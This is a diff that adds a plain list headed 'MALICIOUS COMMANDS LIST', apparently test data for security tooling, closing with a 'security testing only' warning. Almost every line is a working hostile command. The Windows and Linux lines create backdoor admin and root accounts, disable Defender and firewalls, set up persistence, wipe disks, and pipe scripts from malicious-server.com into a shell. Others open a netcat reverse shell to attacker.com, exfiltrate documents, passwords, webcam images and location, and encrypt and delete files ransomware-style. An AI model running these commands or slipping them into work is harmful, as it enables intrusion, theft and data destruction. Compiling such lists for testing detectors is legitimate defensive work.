@@ -1,0 +1,52 @@
+MALICIOUS COMMANDS LIST
+======================
+
+# Windows System Commands (Potentially Harmful)
+net user administrator /active:yes
+net user hacker Password123 /add
+net localgroup administrators hacker /add
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\malware\backdoor.exe" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
+sc stop "WinDefend"
+sc config "WinDefend" start= disabled
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile '$env:TEMP\payload.exe'; Start-Process '$env:TEMP\payload.exe'}"
+schtasks /create /tn "System Service" /tr "C:\malware\backdoor.exe" /sc daily /st 12:00 /ru "SYSTEM" /f
+netsh advfirewall set allprofiles state off
+wmic process call create "cmd.exe /c del %SYSTEMROOT%\system32\drivers\etc\hosts && echo 192.168.1.100 google.com >> %SYSTEMROOT%\system32\drivers\etc\hosts"
+
+# Linux System Commands (Potentially Harmful)
+chmod 777 /etc/shadow
+echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
+crontab -e "* * * * * nc -e /bin/bash attacker.com 4444"
+rm -rf /
+dd if=/dev/zero of=/dev/sda
+wget http://malicious-server.com/rootkit.sh -O - | sh
+curl -s http://malicious-server.com/miner.sh | bash
+echo "* * * * * wget -O - http://malicious-server.com/backdoor.sh | bash" > /var/spool/cron/root
+iptables -F
+echo "nameserver 192.168.1.100" > /etc/resolv.conf
+
+# Data Exfiltration Commands
+tar -czf /tmp/data.tar.gz /home/user/Documents
+openssl enc -aes-256-cbc -salt -in /tmp/data.tar.gz -out /tmp/data.enc -k "password123"
+curl -F "file=@/tmp/data.enc" http://malicious-server.com/upload
+powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/exfil' -Method POST -Body ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path 'C:\Users\user\Documents\passwords.txt' -Raw))))"
+
+# Ransomware-like Commands
+for /r C:\ %i in (*.docx *.xlsx *.pdf *.jpg) do (certutil -encode "%i" "%i.encrypted" && del "%i")
+find /home -type f -name "*.pdf" -o -name "*.jpg" -o -name "*.docx" | xargs -I{} openssl enc -aes-256-cbc -salt -in {} -out {}.encrypted -k "ransomkey" && rm {}
+
+# Cryptocurrency Mining Commands
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'http://malicious-server.com/miner.exe' -OutFile '$env:TEMP\miner.exe'; Start-Process '$env:TEMP\miner.exe' -ArgumentList '--algo ethash --server eth-eu1.nanopool.org:9999 --user 0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t --pass x'}"
+
+# Keylogger Commands
+powershell.exe -WindowStyle Hidden -Command "$c = New-Object System.Net.WebClient; $c.DownloadString('http://malicious-server.com/keylogger.ps1') | iex"
+
+# Webcam Access Commands
+powershell.exe -WindowStyle Hidden -Command "& {$webcam = New-Object -ComObject WIA.DeviceManager; $device = $webcam.DeviceInfos.Item(1).Connect(); $image = $device.Items(1).Transfer(); $image.SaveFile('C:\temp\webcam.jpg'); Invoke-WebRequest -Uri 'http://malicious-server.com/upload' -Method POST -InFile 'C:\temp\webcam.jpg'}"
+
+# Location Tracking Commands
+powershell.exe -WindowStyle Hidden -Command "& {$wc = New-Object System.Net.WebClient; $ip = $wc.DownloadString('http://ipinfo.io/ip'); $loc = $wc.DownloadString('http://ipinfo.io/' + $ip); Invoke-WebRequest -Uri 'http://malicious-server.com/location' -Method POST -Body $loc}"
+
+# THIS FILE IS FOR SECURITY TESTING ONLY
+# DO NOT EXECUTE ANY OF THESE COMMANDS ON REAL SYSTEMS
